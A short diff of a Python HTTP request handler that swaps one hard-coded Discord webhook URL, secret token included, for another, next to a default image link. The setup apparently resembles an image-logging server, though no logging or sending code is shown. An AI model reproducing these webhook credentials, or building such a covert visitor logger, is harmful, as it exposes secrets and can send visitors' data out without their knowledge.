@@ -6,7 +6,7 @@ import urllib.request
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Your webhook URL
-        WEBHOOK = "https://discord.com/api/webhooks/1464388498063884288/7dBwrJezTKRiAfM4DhXxN7mDwQDKwVkvy9hbRqnkIzrT3Y2KEa-hVu-oxGFsBRo98jkz"
+        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
         DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
